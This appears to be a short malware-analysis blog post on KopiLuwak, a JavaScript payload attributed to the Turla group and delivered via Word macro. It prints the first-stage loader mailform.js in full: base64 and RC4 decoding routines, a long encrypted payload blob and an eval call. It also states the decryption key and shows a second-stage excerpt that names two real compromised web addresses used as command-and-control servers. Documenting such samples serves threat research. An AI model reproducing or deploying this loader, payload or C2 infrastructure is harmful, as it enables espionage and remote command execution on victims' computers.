---
title: KopiLuwak
date: '2017-01-28'
tags:
  - windows
  - malware
  - turla
---

KopiLuwak is malware by the Turla group distributed as a Word document. This Word doc contains a macro that decodes a first JavaScript payload which then decrypts a second using the key `'NPEfpRZ4aqnh1YuGwQd0'`. This final payload sends system information to a command and control server which can then issue commands to run on the target computer.

- - -

## References

- [Russian cyber espionage group Turla leverages on a new JavaScript Malware](https://securityaffairs.co/wordpress/55915/apt/turla-javascript-malware.html)
- [KopiLuwak: A New JavaScript Payload from Turla](https://securelist.com/kopiluwak-a-new-javascript-payload-from-turla/77429/)

## First JS Payload: mailform.js

```js
try {
   var lVky = WScript.Arguments;
   var DASz = lVky(0);
   var Iwlh = lyEK();
   Iwlh = JrvS(Iwlh);
   Iwlh = xR68(DASz, Iwlh);
   eval(Iwlh);
} catch (e) {
   WScript.Quit();
}
 
function af5Q(eDBn) {
   var X4u3 = eDBn.charCodeAt(0);
   if (X4u3 === 0x2B || X4u3 === 0x2D) return 62
   if (X4u3 === 0x2F || X4u3 === 0x5F) return 63
   if (X4u3 < 0x30) return -1
   if (X4u3 < 0x30 + 10) return X4u3 - 0x30 + 26 + 26
   if (X4u3 < 0x41 + 26) return X4u3 - 0x41
   if (X4u3 < 0x61 + 26) return X4u3 - 0x61 + 26
}
 
function JrvS(dmBv) {
   var TLzh = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
   var i;
   var j;
   var v5P7;
   if (dmBv.length % 4 > 0)
       return;
   var Qgp4 = dmBv.length;
   var jX8T = dmBv.charAt(Qgp4 - 2) === '=' ? 2 : dmBv.charAt(Qgp4 - 1) === '=' ? 1 : 0
   var y8wu = new Array(dmBv.length * 3 / 4 - jX8T);
   var L71j = jX8T > 0 ? dmBv.length - 4 : dmBv.length;
   var XJqO = 0;
 
   function bQld(uHBU) {
       y8wu[XJqO++] = uHBU;
   }
   for (i = 0, j = 0; i < L71j; i += 4, j += 3) {
       v5P7 = (af5Q(dmBv.charAt(i)) << 18) | (af5Q(dmBv.charAt(i + 1)) << 12) | (af5Q(dmBv.charAt(i + 2)) << 6) | af5Q(dmBv.charAt(i + 3));
       bQld((v5P7 & 0xFF0000) >> 16)
       bQld((v5P7 & 0xFF00) >> 8)
       bQld(v5P7 & 0xFF)
   }
   if (jX8T === 2) {
       v5P7 = (af5Q(dmBv.charAt(i)) << 2) | (af5Q(dmBv.charAt(i + 1)) >> 4)
       bQld(v5P7 & 0xFF)
   } else if (jX8T === 1) {
       v5P7 = (af5Q(dmBv.charAt(i)) << 10) | (af5Q(dmBv.charAt(i + 1)) << 4) | (af5Q(dmBv.charAt(i + 2)) >> 2)
       bQld((v5P7 >> 8) & 0xFF)
       bQld(v5P7 & 0xFF)
   }
   return y8wu
}
 
function xR68(oGy3, SwPd) {
   var Yvh0 = [];
   var LFdV = 0;
   var EzAm;
   var y8wu = '';
   for (var i = 0; i < 256; i++) {
       Yvh0[i] = i;
   }
   for (var i = 0; i < 256; i++) {
       LFdV = (LFdV + Yvh0[i] + oGy3.charCodeAt(i % oGy3.length)) % 256;
       EzAm = Yvh0[i];
       Yvh0[i] = Yvh0[LFdV];
       Yvh0[LFdV] = EzAm;
   }
   var i = 0;
   var LFdV = 0;
   for (var y = 0; y < SwPd.length; y++) {
       i = (i + 1) % 256;
       LFdV = (LFdV + Yvh0[i]) % 256;
       EzAm = Yvh0[i];
       Yvh0[i] = Yvh0[LFdV];
       Yvh0[LFdV] = EzAm;
       y8wu += String.fromCharCode(SwPd[y] ^ Yvh0[(Yvh0[i] + Yvh0[LFdV]) % 256]);
   }
   return y8wu;
}
 
function lyEK() {
   var U5l2 = "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";
    return U5l2;
}
``` 

## Second JS Payload 

```js
function S7EN(KL3M) {
    var gfjd = WScript.CreateObject("ADODB.Stream")
    gfjd.Type = 2;
    gfjd.CharSet = '437';
    gfjd.Open();
    gfjd.LoadFromFile(KL3M);
    var j3k6 = gfjd.ReadText;
    gfjd.Close();
    return l9BJ(j3k6);
}
var WQuh = new Array("http://soligro.com/wp-includes/pomo/db.php", "http://belcollegium.org/wp-admin/includes/class-wp-upload-plugins-list-table.php");
var zIRF = "KRMLT0G3PHdYjnEm";
